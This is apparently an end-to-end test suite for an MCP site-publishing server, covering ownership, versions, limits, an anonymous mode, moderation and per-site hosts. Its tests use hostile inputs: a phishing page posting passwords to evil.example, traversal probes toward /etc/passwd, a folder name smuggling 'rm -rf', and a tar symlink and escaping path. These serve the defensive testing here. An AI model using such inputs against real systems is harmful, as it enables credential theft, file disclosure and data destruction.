"""End-to-end: start the server on a free port with a temporary data folder and use it like an agent and a visitor
would. Standard library only:  python -m unittest discover -s tests"""
import base64
import json
import os
import io
import re
import socket
import subprocess
import sys
import tarfile
import tempfile
import time
import unittest
import urllib.error
import urllib.request

APP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "app")
KEY, KEY2, ADMIN = "k" * 40, "q" * 40, "r" * 40


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


opener = urllib.request.build_opener(NoRedirect)


class Harness(unittest.TestCase):
    """A server of its own per class, and the calls an agent and a visitor make."""
    EXTRA = {}

    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            cls.port = s.getsockname()[1]
        cls.base = f"http://127.0.0.1:{cls.port}"
        env = {**os.environ, "DATA_DIR": cls.tmp.name, "PORT": str(cls.port), "MCP_KEYS": f"ada:{KEY},bob:{KEY2},root:{ADMIN},short:abc", "ADMIN_AGENTS": "root,nobody",
               "PUBLIC_URL": "https://pages.example.com", "MAX_SITE_MB": "1", "MAX_FILES": "5", **cls.EXTRA}
        cls.proc = subprocess.Popen([sys.executable, "server.py"], cwd=APP, env=env, stdout=subprocess.DEVNULL)
        for _ in range(100):
            try:
                urllib.request.urlopen(cls.base + "/health")
                return
            except OSError:
                time.sleep(0.05)
        raise RuntimeError("server did not start")

    @classmethod
    def tearDownClass(cls):
        cls.proc.terminate()
        cls.proc.wait()
        cls.tmp.cleanup()

    def http(self, path, headers=None, method="GET"):
        req = urllib.request.Request(self.base + path, headers=headers or {}, method=method)
        try:
            with opener.open(req) as r:
                return r.status, r.read(), r.headers
        except urllib.error.HTTPError as e:
            return e.code, e.read(), e.headers

    def call(self, tool, args=None, key=KEY):
        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": tool, "arguments": args or {}}}).encode()
        headers = {"Content-Type": "application/json", **({"Authorization": f"Bearer {key}"} if key else {})}
        req = urllib.request.Request(self.base + "/mcp", body, headers)
        with urllib.request.urlopen(req) as r:
            return json.load(r)["result"]

    def ok(self, tool, args=None, key=KEY):
        result = self.call(tool, args, key)
        self.assertFalse(result["isError"], result)
        return result["structuredContent"]

    def refused(self, tool, args=None, key=KEY):
        result = self.call(tool, args, key)
        self.assertTrue(result["isError"], result)
        return result["content"][0]["text"]

    def post(self, path, body):
        req = urllib.request.Request(self.base + path, body, method="POST")
        try:
            with urllib.request.urlopen(req) as r:
                return r.status, r.read().decode()
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode()

    def upload_path(self, **args):
        out = self.ok("publish_folder", args)
        self.assertIn("tar -czf - -C", out["command"])
        return re.search(r"https://pages\.example\.com(/upload/\S+)$", out["command"]).group(1)

    def tar(self, files, links=(), mode="w:gz"):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode=mode) as t:
            for name, data in files.items():
                info = tarfile.TarInfo(name)
                info.size = len(data)
                t.addfile(info, io.BytesIO(data))
            for name, target in links:
                info = tarfile.TarInfo(name)
                info.type = tarfile.SYMTYPE
                info.linkname = target
                t.addfile(info)
        return buf.getvalue()


class Server(Harness):
    def test_one_page_gets_a_link_anyone_can_open(self):
        out = self.ok("publish_site", {"html": "<h1>hej</h1>", "title": "Hej"})
        self.assertRegex(out["url"], r"^https://pages\.example\.com/[a-z]+-[a-z]+-[0-9a-f]{6}/$")
        code, body, headers = self.http(f"/{out['site']}/")
        self.assertEqual((code, body), (200, b"<h1>hej</h1>"))
        self.assertEqual(headers["Content-Type"], "text/html; charset=utf-8")
        self.assertEqual(headers["X-Robots-Tag"], "noindex")
        self.assertNotIn("Set-Cookie", headers)

    def test_updating_keeps_the_link(self):
        out = self.ok("publish_site", {"html": "one"})
        again = self.ok("publish_site", {"html": "two", "site": out["site"]})
        self.assertEqual(out["url"], again["url"])
        self.assertEqual(self.http(f"/{out['site']}/")[1], b"two")

    def test_a_whole_site_replaces_the_old_one_unless_asked(self):
        s = self.ok("publish_site", {"files": {"index.html": "i", "a.js": "1"}})["site"]
        self.ok("publish_site", {"site": s, "files": {"b.js": "2"}, "keep_existing": True})
        self.assertEqual(self.http(f"/{s}/a.js")[1], b"1")
        self.assertEqual(self.http(f"/{s}/b.js")[1], b"2")
        self.ok("publish_site", {"site": s, "files": {"index.html": "new"}})
        self.assertEqual(self.http(f"/{s}/a.js")[0], 404)

    def test_types_folders_and_binary(self):
        png = bytes(range(256))
        s = self.ok("publish_site", {"site": "folders", "files": {"index.html": "i", "js/app.mjs": "x", "docs/index.html": "docs"},
                                     "binary_files": {"img/a.png": base64.b64encode(png).decode()}})["site"]
        code, body, headers = self.http(f"/{s}/img/a.png")
        self.assertEqual((code, body, headers["Content-Type"]), (200, png, "image/png"))
        self.assertEqual(self.http(f"/{s}/js/app.mjs")[2]["Content-Type"], "text/javascript; charset=utf-8")
        self.assertEqual(self.http(f"/{s}/docs/")[1], b"docs")
        code, _, headers = self.http(f"/{s}/docs?x=1")
        self.assertEqual((code, headers["Location"]), (301, f"/{s}/docs/?x=1"))

    def test_a_site_without_slash_redirects(self):
        s = self.ok("publish_site", {"html": "x"})["site"]
        code, _, headers = self.http(f"/{s}")
        self.assertEqual((code, headers["Location"]), (301, f"/{s}/"))

    def test_a_site_can_have_its_own_404(self):
        s = self.ok("publish_site", {"files": {"index.html": "i", "404.html": "gone"}})["site"]
        code, body, _ = self.http(f"/{s}/nope")
        self.assertEqual((code, body), (404, b"gone"))

    def test_nothing_outside_the_manifest_is_served(self):
        s = self.ok("publish_site", {"html": "x"})["site"]
        for path in (f"/{s}/../{s}/site.json", f"/{s}/site.json", f"/{s}/blobs/", f"/{s}/%2e%2e/%2e%2e/etc/passwd"):
            self.assertEqual(self.http(path)[0], 404, path)

    def test_bad_paths_are_refused(self):
        for bad in ("../x.html", "/abs.html", "a//b.js", ".env", "a/.hidden", "a\\b.js"):
            self.assertIn("Bad file path", self.refused("publish_site", {"files": {"index.html": "i", bad: "x"}}), bad)

    def test_a_site_needs_an_index(self):
        self.assertIn("index.html", self.refused("publish_site", {"files": {"a.js": "x"}}))

    def test_reserved_and_bad_names(self):
        self.assertIn("reserved", self.refused("publish_site", {"html": "x", "site": "mcp"}))
        self.assertIn("lower-case", self.refused("publish_site", {"html": "x", "site": "Bad_Name"}))

    def test_another_agent_cannot_touch_it(self):
        s = self.ok("publish_site", {"html": "mine"})["site"]
        self.assertIn("another agent", self.refused("publish_site", {"html": "theirs", "site": s}, KEY2))
        self.assertIn("another agent", self.refused("delete_site", {"site": s}, KEY2))
        self.assertEqual(self.http(f"/{s}/")[1], b"mine")
        self.assertNotIn(s, [x["site"] for x in self.ok("list_sites", key=KEY2)["sites"]])

    def test_limits(self):
        self.assertIn("Too large", self.refused("publish_site", {"html": "x" * 1200000}))
        self.assertIn("Too many", self.refused("publish_site", {"files": {"index.html": "i", **{f"{n}.js": "x" for n in range(6)}}}))

    def test_read_back_and_delete(self):
        s = self.ok("publish_site", {"files": {"index.html": "<p>", "a.js": "code"}})["site"]
        self.assertEqual(self.ok("read_site", {"site": s})["paths"], {"a.js": 4, "index.html": 3})
        self.assertEqual(self.ok("read_site", {"site": s, "path": "a.js"})["content"], "code")
        self.ok("delete_site", {"site": s})
        self.assertEqual(self.http(f"/{s}/")[0], 404)

    def test_root_paths_get_a_warning(self):
        out = self.ok("publish_site", {"html": '<script src="/assets/a.js"></script>'})
        self.assertIn("relative", out["warnings"][0])
        self.assertEqual(self.ok("publish_site", {"html": '<script src="a.js"></script><img src="//x.org/a.png">'})["warnings"], [])

    def test_unchanged_files_are_not_sent_twice(self):
        s = self.ok("publish_site", {"html": "x"})["site"]
        etag = self.http(f"/{s}/")[2]["ETag"]
        self.assertEqual(self.http(f"/{s}/", {"If-None-Match": etag})[0], 304)

    def test_head_has_no_body(self):
        s = self.ok("publish_site", {"html": "hello"})["site"]
        code, body, headers = self.http(f"/{s}/", method="HEAD")
        self.assertEqual((code, body, headers["Content-Length"]), (200, b"", "5"))

    def test_publishing_needs_a_key_and_short_keys_do_not_count(self):
        for key in ("wrong" * 10, "abc"):
            with self.assertRaises(urllib.error.HTTPError) as e:
                self.call("list_sites", key=key)
            self.assertEqual(e.exception.code, 401)

    def test_no_key_is_refused_unless_in_danger_mode(self):
        if self.EXTRA:
            return
        with self.assertRaises(urllib.error.HTTPError) as e:
            self.call("publish_site", {"html": "x"}, key=None)
        self.assertEqual(e.exception.code, 401)
        self.assertNotIn(b"Anyone can publish", self.http("/")[1])

    def test_only_an_admin_sees_every_site(self):
        tools = lambda key: {t["name"] for t in self.rpc_list(key)}
        self.assertIn("list_all_sites", tools(ADMIN))
        self.assertNotIn("list_all_sites", tools(KEY))
        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "list_all_sites", "arguments": {}}}).encode()
        req = urllib.request.Request(self.base + "/mcp", body, {"Authorization": f"Bearer {KEY}"})
        self.assertIn("Unknown tool", json.load(urllib.request.urlopen(req))["error"]["message"])
        a = self.ok("publish_site", {"html": "from ada"})["site"]
        b = self.ok("publish_site", {"html": "from bob"}, KEY2)["site"]
        listed = {x["site"]: x for x in self.ok("list_all_sites", key=ADMIN)["sites"]}
        self.assertEqual((listed[a]["owner"], listed[b]["owner"]), ("ada", "bob"))
        self.assertIn("signals:", listed[a]["review"])

    def test_an_admin_can_take_any_site_down(self):
        s = self.ok("publish_site", {"html": "bob's"}, KEY2)["site"]
        self.ok("delete_site", {"site": s}, ADMIN)
        self.assertEqual(self.http(f"/{s}/")[0], 404)

    def feed(self, key):
        return self.http("/moderation/feed", {"Authorization": f"Bearer {key}"} if key else {})

    def test_the_feed_needs_an_admin_key_and_flags_what_matters(self):
        self.assertEqual(self.feed(None)[0], 401)
        self.assertEqual(self.feed(KEY)[0], 401)
        page = '<title>Log in</title><form action="https://evil.example/steal"><input type="password"></form><script>eval(atob("x"))</script>'
        s = self.ok("publish_site", {"html": page, "site": "phish-test"})["site"]
        code, body, headers = self.feed(ADMIN)
        text = body.decode()
        self.assertEqual(code, 200)
        self.assertEqual(headers["Cache-Control"], "no-store")
        block = text[text.index(f"site {s} "):].split("\n\n")[0]
        self.assertIn("password field", block)
        self.assertIn("form sends to evil.example", block)
        self.assertIn("obfuscation-like calls x2", block)
        self.assertIn("title: Log in", block)
        self.assertEqual(self.feed(ADMIN)[1], body, "the same sites give the same feed, so a watcher can hash it")

    def test_a_take_down_link_asks_first_and_works_once(self):
        s = self.ok("publish_site", {"html": "<h1>bad</h1>"}, KEY2)["site"]
        text = self.feed(ADMIN)[1].decode()
        link = re.search(rf"https://pages\.example\.com(/moderation/takedown/{s}/[0-9a-f]{{32}})", text).group(1)
        code, body, _ = self.http(link)
        self.assertEqual(code, 200)
        self.assertIn(b"<form method=\"post\">", body)
        self.assertEqual(self.http(f"/{s}/")[0], 200, "opening the link, as a chat preview does, must not take it down")
        self.assertEqual(self.post(link, b"")[0], 200)
        self.assertEqual(self.http(f"/{s}/")[0], 404)
        self.assertEqual(self.post(link, b"")[0], 404)

    def test_a_take_down_link_dies_when_the_site_changes(self):
        s = self.ok("publish_site", {"html": "v1"})["site"]
        link = re.search(rf"(/moderation/takedown/{s}/[0-9a-f]{{32}})", self.feed(ADMIN)[1].decode()).group(1)
        time.sleep(1.1)
        self.ok("publish_site", {"html": "v2", "site": s})
        self.assertEqual(self.post(link, b"")[0], 404)
        self.assertEqual(self.post(f"/moderation/takedown/{s}/{'0' * 32}", b"")[0], 404)

    def rpc_list(self, key):
        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).encode()
        req = urllib.request.Request(self.base + "/mcp", body, {"Authorization": f"Bearer {key}"})
        return json.load(urllib.request.urlopen(req))["result"]["tools"]

    def test_mcp_handshake(self):
        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).encode()
        req = urllib.request.Request(self.base + "/mcp", body, {"Authorization": f"Bearer {KEY}"})
        names = {t["name"] for t in json.load(urllib.request.urlopen(req))["result"]["tools"]}
        self.assertEqual(names, {"publish_site", "publish_folder", "list_sites", "read_site", "delete_site", "list_versions", "restore_site"})

    def blobs(self, site):
        return len(os.listdir(os.path.join(self.tmp.name, "sites", site, "blobs")))

    def test_a_publish_can_be_undone(self):
        s = self.ok("publish_site", {"site": "undo", "files": {"index.html": "working", "lib.js": "same"}})["site"]
        broken = self.ok("publish_site", {"site": s, "files": {"index.html": "broken", "lib.js": "same"}})
        self.assertEqual(broken["version"], 2)
        listed = self.ok("list_versions", {"site": s})
        self.assertEqual((listed["live"]["version"], [v["version"] for v in listed["earlier"]]), (2, [1]))
        back = self.ok("restore_site", {"site": s, "version": 1})
        self.assertEqual((back["version"], back["restored_from"], back["url"]), (3, 1, broken["url"]), "same link, new version number")
        self.assertEqual(self.http(f"/{s}/")[1], b"working")
        self.assertEqual([v["version"] for v in self.ok("list_versions", {"site": s})["earlier"]], [2, 1])
        self.ok("restore_site", {"site": s, "version": 2})
        self.assertEqual(self.http(f"/{s}/")[1], b"broken", "a restore can be undone the same way")
        self.assertEqual(self.blobs(s), 3, "working, broken and the shared lib.js, each stored once")

    def test_versions_are_bounded_and_their_files_go_with_them(self):
        s = self.ok("publish_site", {"site": "many", "html": "v1"})["site"]
        for n in range(2, 16):
            self.ok("publish_site", {"site": s, "html": f"v{n}"})
        earlier = [v["version"] for v in self.ok("list_versions", {"site": s})["earlier"]]
        self.assertEqual(earlier, list(range(14, 4, -1)), "the ten before the live one")
        self.assertEqual(self.blobs(s), 11)
        self.assertIn("no version 2", self.refused("restore_site", {"site": s, "version": 2}))

    def test_only_the_owner_sees_and_restores_versions(self):
        s = self.ok("publish_site", {"site": "mine", "html": "a"})["site"]
        self.ok("publish_site", {"site": s, "html": "b"})
        self.assertIn("another agent", self.refused("list_versions", {"site": s}, KEY2))
        self.assertIn("another agent", self.refused("restore_site", {"site": s, "version": 1}, KEY2))
        self.assertIn("must be a number", self.refused("restore_site", {"site": s, "version": "latest"}))
        self.assertEqual(self.http(f"/{s}/")[1], b"b")

    def test_deleting_a_site_deletes_its_versions(self):
        s = self.ok("publish_site", {"site": "gone", "html": "a"})["site"]
        self.ok("publish_site", {"site": s, "html": "b"})
        self.ok("delete_site", {"site": s})
        self.assertFalse(os.path.exists(os.path.join(self.tmp.name, "sites", s)))
        self.ok("publish_site", {"site": s, "html": "new owner, fresh start"}, KEY2)
        self.assertEqual(self.ok("list_versions", {"site": s}, KEY2)["earlier"], [])

    def test_a_folder_is_published_with_one_command(self):
        path = self.upload_path(folder="/opt/data/my game", title="Spelet")
        code, text = self.post(path, self.tar({"./index.html": b"<h1>game</h1>", "./content/a.js": b"x"}))
        self.assertEqual(code, 200, text)
        url = text.strip()
        self.assertRegex(url, r"^https://pages\.example\.com/[a-z]+-[a-z]+-[0-9a-f]{6}/$")
        site = url.rstrip("/").rsplit("/", 1)[1]
        self.assertEqual(self.http(f"/{site}/")[1], b"<h1>game</h1>")
        self.assertEqual(self.http(f"/{site}/content/a.js")[1], b"x")
        self.assertEqual(self.ok("read_site", {"site": site})["title"], "Spelet")

    def test_the_folder_path_is_quoted_for_the_shell(self):
        self.assertIn("-C '/opt/data/my game; rm -rf x' .", self.ok("publish_folder", {"folder": "/opt/data/my game; rm -rf x"})["command"])

    def test_a_folder_updates_the_same_link(self):
        site = self.post(self.upload_path(), self.tar({"index.html": b"one"}))[1].strip().rstrip("/").rsplit("/", 1)[1]
        code, text = self.post(self.upload_path(site=site), self.tar({"index.html": b"two"}))
        self.assertEqual(code, 200, text)
        self.assertEqual(self.http(f"/{site}/")[1], b"two")

    def test_another_agents_site_cannot_be_uploaded_over(self):
        site = self.ok("publish_site", {"html": "mine"})["site"]
        out = self.ok("publish_folder", {"site": site}, KEY2)
        path = re.search(r"(/upload/\S+)$", out["command"]).group(1)
        code, text = self.post(path, self.tar({"index.html": b"theirs"}))
        self.assertEqual(code, 400)
        self.assertIn("another agent", text)
        self.assertEqual(self.http(f"/{site}/")[1], b"mine")

    def test_an_upload_link_works_once(self):
        path = self.upload_path()
        self.assertEqual(self.post(path, self.tar({"index.html": b"x"}))[0], 200)
        self.assertEqual(self.post(path, self.tar({"index.html": b"x"}))[0], 404)
        self.assertEqual(self.post("/upload/made-up", self.tar({"index.html": b"x"}))[0], 404)

    def test_a_failed_upload_can_be_retried(self):
        path = self.upload_path()
        code, text = self.post(path, self.tar({"a.js": b"x"}))
        self.assertEqual(code, 400)
        self.assertIn("index.html", text)
        self.assertEqual(self.post(path, self.tar({"index.html": b"x"}))[0], 200)

    def test_hidden_files_links_and_node_modules_stay_out(self):
        tree = {"index.html": b"i", ".env": b"SECRET", ".git/config": b"x", "node_modules/a/b.js": b"x", "ok.js": b"y"}
        url = self.post(self.upload_path(), self.tar(tree, links=[("passwd", "/etc/passwd")]))[1].strip()
        site = url.rstrip("/").rsplit("/", 1)[1]
        self.assertEqual(set(self.ok("read_site", {"site": site})["paths"]), {"index.html", "ok.js"})

    def test_an_archive_cannot_climb_out(self):
        code, text = self.post(self.upload_path(), self.tar({"index.html": b"i", "../../evil.html": b"x"}))
        self.assertEqual(code, 400)
        self.assertIn("Bad file path", text)

    def test_a_single_page_can_be_uploaded(self):
        code, text = self.post(self.upload_path(), b"<!doctype html><h1>one file</h1>")
        self.assertEqual(code, 200, text)
        self.assertEqual(self.http("/" + text.strip().rstrip("/").rsplit("/", 1)[1] + "/")[1], b"<!doctype html><h1>one file</h1>")

    def test_nothing_or_rubbish_is_not_published(self):
        for body in (b"", b"not an archive"):
            code, text = self.post(self.upload_path(), body)
            self.assertEqual(code, 400, body)
            self.assertIn("neither", text)

    def test_an_upload_over_the_limit_is_refused(self):
        code, text = self.post(self.upload_path(), self.tar({"index.html": b"i", "big.bin": b"z" * 1100000}))
        self.assertEqual(code, 400)
        self.assertIn("Too large", text)


if __name__ == "__main__":
    unittest.main()


class DangerMode(Server):
    """The same server with DANGER_MODE on: everything above still holds for keyed agents, and this is what changes."""
    EXTRA = {"DANGER_MODE": "on", "DANGER_MAX_SITE_MB": "1", "DANGER_PUBLISHES_PER_HOUR": "1000", "TRUSTED_PROXY_HEADER": "X-Real-IP"}

    def anon(self, tool, args=None):
        return self.ok(tool, args, key=None)

    def test_anyone_can_publish_and_gets_an_edit_token(self):
        out = self.anon("publish_site", {"html": "<h1>open</h1>"})
        self.assertGreaterEqual(len(out["edit_token"]), 20)
        self.assertEqual(self.http(f"/{out['site']}/")[1], b"<h1>open</h1>")
        self.assertIn(b"Anyone can publish", self.http("/")[1])

    def test_only_the_edit_token_changes_it(self):
        out = self.anon("publish_site", {"html": "one"})
        s, token = out["site"], out["edit_token"]
        self.assertIn("another agent", self.refused("publish_site", {"html": "vandal", "site": s}, key=None))
        self.assertIn("another agent", self.refused("publish_site", {"html": "vandal", "site": s, "edit_token": "x" * 30}, key=None))
        self.assertIn("another agent", self.refused("publish_site", {"html": "vandal", "site": s}))
        self.assertEqual(self.anon("publish_site", {"html": "two", "site": s, "edit_token": token})["url"], out["url"])
        self.assertEqual(self.http(f"/{s}/")[1], b"two")
        self.assertEqual([x["site"] for x in self.anon("list_sites", {"edit_token": token})["sites"]], [s])
        self.assertIn("edit_token", self.refused("delete_site", {"site": s}, key=None))
        self.anon("delete_site", {"site": s, "edit_token": token})
        self.assertEqual(self.http(f"/{s}/")[0], 404)

    def test_an_agents_site_cannot_be_taken_without_its_key(self):
        s = self.ok("publish_site", {"html": "agent"})["site"]
        self.assertIn("another agent", self.refused("publish_site", {"html": "x", "site": s}, key=None))
        self.assertEqual(self.http(f"/{s}/")[1], b"agent")

    def test_a_wrong_key_is_still_refused(self):
        with self.assertRaises(urllib.error.HTTPError) as e:
            self.call("publish_site", {"html": "x"}, key="wrong" * 10)
        self.assertEqual(e.exception.code, 401)

    def test_without_a_key_the_edit_token_restores(self):
        out = self.anon("publish_site", {"html": "one"})
        s, token = out["site"], out["edit_token"]
        self.anon("publish_site", {"html": "two", "site": s, "edit_token": token})
        self.assertIn("edit_token", self.refused("restore_site", {"site": s, "version": 1}, key=None))
        self.anon("restore_site", {"site": s, "version": 1, "edit_token": token})
        self.assertEqual(self.http(f"/{s}/")[1], b"one")

    def test_a_folder_without_a_key(self):
        out = self.anon("publish_folder", {})
        path = re.search(r"(/upload/\S+)$", out["command"]).group(1)
        code, text = self.post(path, self.tar({"index.html": b"folder"}))
        self.assertEqual(code, 200, text)
        self.assertIn(out["edit_token"], text)
        site = text.splitlines()[0].rstrip("/").rsplit("/", 1)[1]
        self.assertEqual(self.http(f"/{site}/")[1], b"folder")


class DangerLimits(unittest.TestCase):
    """Publishing without a key is throttled per address, and has its own, smaller size limit."""

    def test_per_address_and_size(self):
        env = {"DANGER_MODE": "on", "DANGER_PUBLISHES_PER_HOUR": "2", "DANGER_MAX_SITE_MB": "1", "MAX_SITE_MB": "3",
               "TRUSTED_PROXY_HEADER": "X-Real-IP"}
        Server.EXTRA, saved = env, Server.EXTRA
        try:
            Server.setUpClass()
            srv = Server("test_head_has_no_body")

            def anon(html, ip):
                body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                                   "params": {"name": "publish_site", "arguments": {"html": html}}}).encode()
                req = urllib.request.Request(Server.base + "/mcp", body, {"X-Real-IP": ip})
                return json.load(urllib.request.urlopen(req))["result"]

            self.assertIn("Too large", anon("x" * 1200000, "1.1.1.1")["content"][0]["text"])
            self.assertFalse(anon("a", "2.2.2.2")["isError"])
            self.assertFalse(anon("b", "2.2.2.2")["isError"])
            self.assertIn("Too many", anon("c", "2.2.2.2")["content"][0]["text"])
            self.assertFalse(anon("d", "3.3.3.3")["isError"])
            self.assertFalse(srv.call("publish_site", {"html": "y" * 1200000})["isError"], "a keyed agent keeps its own limit")
        finally:
            Server.tearDownClass()
            Server.EXTRA = saved


class SiteDomain(Harness):
    """With SITE_DOMAIN, an agent's site is an origin of its own: storage, cookies and service workers are its alone, and
    a build that refers to /assets/... works as it is. Sites published without a key stay on the shared host."""
    EXTRA = {"SITE_DOMAIN": "pages.example.com", "DANGER_MODE": "on", "DANGER_PUBLISHES_PER_HOUR": "1000"}

    def on(self, site, path="/", method="GET"):
        return self.http(path, {"Host": f"{site}.pages.example.com"}, method)

    def test_an_agents_site_gets_its_own_host(self):
        out = self.ok("publish_site", {"site": "snake", "files": {"index.html": '<script src="/assets/game.js"></script>',
                                                                   "assets/game.js": "go()"}})
        self.assertEqual(out["url"], "https://snake.pages.example.com/")
        self.assertEqual(out["warnings"], [], "a root path is the site's own file on its own host")
        self.assertEqual(self.on("snake")[:2], (200, b'<script src="/assets/game.js"></script>'))
        code, body, headers = self.on("snake", "/assets/game.js")
        self.assertEqual((code, body, headers["Content-Type"]), (200, b"go()", "text/javascript; charset=utf-8"))
        self.assertEqual(self.http("/snake/assets/game.js", {"Host": "snake.pages.example.com:443"})[0], 404,
                         "on its own host the site starts at the root")
        self.assertEqual(self.http("/assets/game.js", {"Host": "SNAKE.Pages.Example.com.:443"})[1], b"go()")

    def test_the_old_link_redirects_to_the_new_host(self):
        self.ok("publish_site", {"site": "moved", "files": {"index.html": "i", "docs/index.html": "d"}})
        for path, to in (("/moved", "https://moved.pages.example.com/"), ("/moved/", "https://moved.pages.example.com/"),
                         ("/moved/docs/?level=2", "https://moved.pages.example.com/docs/?level=2"),
                         ("/moved//evil.example/x", "https://moved.pages.example.com//evil.example/x")):
            code, _, headers = self.http(path)
            self.assertEqual((code, headers["Location"]), (302, to), path)
        code, _, headers = self.on("moved", "/docs?x=1")
        self.assertEqual((code, headers["Location"]), (301, "/docs/?x=1"))

    def test_a_host_with_no_site_is_a_404(self):
        # The hotel asks for a certificate only for a name that answers 2xx or 3xx at /.
        self.ok("publish_site", {"site": "real", "html": "r"})
        self.assertEqual(self.on("nosuchsite")[0], 404)
        self.assertEqual(self.on("a.real")[0], 404, "one label only, as a wildcard certificate means it")
        self.assertEqual(self.http("/", {"Host": "pages.example.com"})[0], 200, "the server's own address is the home page")

    def test_a_site_host_serves_that_site_and_nothing_else(self):
        self.ok("publish_site", {"site": "one", "html": "1"})
        self.ok("publish_site", {"site": "two", "html": "2"})
        self.assertEqual(self.on("one", "/two/")[0], 404)
        self.assertEqual(self.on("one", "/health")[0], 404)
        self.assertEqual(self.on("one", "/moderation/feed")[0], 404)
        self.assertEqual(self.on("one", "/mcp", "POST")[0], 404)
        self.assertEqual(self.http("/health")[0], 200, "the container's own address still answers the health check")

    def test_sites_without_a_key_stay_on_the_shared_host(self):
        # Each name on a site host costs a certificate, and a registered domain gets only so many a week.
        out = self.ok("publish_site", {"html": "anon"}, key=None)
        self.assertRegex(out["url"], r"^https://pages\.example\.com/[a-z]+-[a-z]+-[0-9a-f]{6}/$")
        self.assertEqual(self.http(f"/{out['site']}/")[1], b"anon")
        self.assertEqual(self.on(out["site"])[0], 404)
        warned = self.ok("publish_site", {"html": '<img src="/logo.png">'}, key=None)["warnings"]
        self.assertEqual(len(warned), 1)

    def test_a_folder_upload_prints_the_new_host(self):
        path = self.upload_path(site="game")
        code, text = self.post(path, self.tar({"index.html": b"<link href='/style.css'>", "style.css": b"x"}))
        self.assertEqual((code, text), (200, "https://game.pages.example.com/\n"))

    def test_www_is_not_a_site_name(self):
        self.assertIn("reserved", self.refused("publish_site", {"html": "x", "site": "www"}))


class LegacySites(unittest.TestCase):
    """A site published before versions existed has no number. Its first publish after keeps it as version 1."""

    def test_an_old_site_becomes_version_one(self):
        sys.path.insert(0, APP)
        from store import Store
        with tempfile.TemporaryDirectory() as data:
            store = Store(data, 1048576, 10, 10)
            meta = store.publish({"index.html": b"old"}, "ada", name="legacy")
            path = os.path.join(data, "sites", "legacy", "site.json")
            del meta["version"]
            with open(path, "w") as f:
                json.dump(meta, f)
            new = store.publish({"index.html": b"new"}, "ada", name="legacy")
            self.assertEqual(new["version"], 2)
            self.assertEqual([v["version"] for v in store.versions("legacy")], [1])
            self.assertEqual(store.read("legacy", "index.html")[0], b"new")
            store.restore("legacy", "ada", 1)
            self.assertEqual(store.read("legacy", "index.html")[0], b"old")


BROWSER = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36",
           "Sec-Fetch-Dest": "document"}


class StartPageAndDashboard(Harness):
    """What a person sees at the root, what counts as a visit, and the admin's dashboard link."""
    EXTRA = {"HOME_CACHE_SECONDS": "0", "STATS_FLUSH_SECONDS": "0"}

    def dashboard(self, key=ADMIN):
        out = self.ok("dashboard_link", key=key)
        self.assertRegex(out["url"], r"^https://pages\.example\.com/moderation/dashboard/root/\d+/[0-9a-f]{32}$")
        return out["url"][len("https://pages.example.com"):]

    def visits(self, site, key=KEY):
        return next(s["visits_7d"] for s in self.ok("list_sites", key=key)["sites"] if s["site"] == site)

    def test_the_start_page_explains_without_listing_any_site(self):
        self.ok("publish_site", {"html": "x", "site": "quiet-garden", "title": "My diary"})
        code, body, headers = self.http("/")
        page = body.decode()
        self.assertEqual(code, 200)
        self.assertIn("https://pages.example.com/mcp", page)
        self.assertIn("claude mcp add --transport http pages", page)
        self.assertIn("Authorization: Bearer &lt;your key&gt;", page)
        self.assertIn("1 MB", page)  # MAX_SITE_MB from the environment
        self.assertNotIn("quiet-garden", page)
        self.assertNotIn("My diary", page)
        self.assertNotIn("ada", page)
        self.assertIn("default-src 'none'", headers["Content-Security-Policy"])
        # One script, the theme switcher, and the policy allows exactly that one by its hash
        scripts = re.findall(r"<script>(.*?)</script>", page, re.S)
        self.assertEqual(len(scripts), 1)
        digest = "sha256-" + base64.b64encode(__import__("hashlib").sha256(scripts[0].encode()).digest()).decode()
        self.assertIn(f"script-src '{digest}'", headers["Content-Security-Policy"])
        self.assertNotIn("<script src", page)
        for theme in ("t-auto", "t-light", "t-dark"):
            self.assertIn(f'id="{theme}"', page)
        self.assertIn('<link rel="icon" href="data:image/svg+xml,', page)
        self.assertEqual(headers["X-Frame-Options"], "DENY")

    def test_a_page_view_in_a_browser_is_a_visit_and_nothing_else_is(self):
        self.ok("publish_site", {"files": {"index.html": "<p>hi</p>", "app.js": "1", "more.html": "m"}, "site": "counted"})
        self.http("/counted/", BROWSER)
        self.http("/counted/more.html", BROWSER)
        self.http("/counted/app.js", BROWSER)  # an asset
        self.http("/counted/", {**BROWSER, "Sec-Fetch-Dest": "script"})
        self.http("/counted/", {**BROWSER, "Sec-Purpose": "prefetch"})
        self.http("/counted/", {"User-Agent": "curl/8.5"})
        self.http("/counted/", {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"})
        self.http("/counted/", BROWSER, method="HEAD")
        self.http("/counted/missing.html", BROWSER)  # a 404
        self.http("/counted/", {**BROWSER, "Sec-Fetch-Dest": "iframe"})  # a game shown in a frame on another page
        self.assertEqual(self.visits("counted"), 3)

    def test_only_an_admin_gets_a_dashboard(self):
        names = lambda key: [t["name"] for t in self.list_tools(key)]
        self.assertIn("dashboard_link", names(ADMIN))
        self.assertNotIn("dashboard_link", names(KEY))
        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "dashboard_link", "arguments": {}}}).encode()
        req = urllib.request.Request(self.base + "/mcp", body, {"Content-Type": "application/json", "Authorization": f"Bearer {KEY}"})
        with urllib.request.urlopen(req) as r:
            self.assertIn("Unknown tool", json.load(r)["error"]["message"])

    def list_tools(self, key):
        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).encode()
        req = urllib.request.Request(self.base + "/mcp", body, {"Content-Type": "application/json", "Authorization": f"Bearer {key}"})
        with urllib.request.urlopen(req) as r:
            return json.load(r)["result"]["tools"]

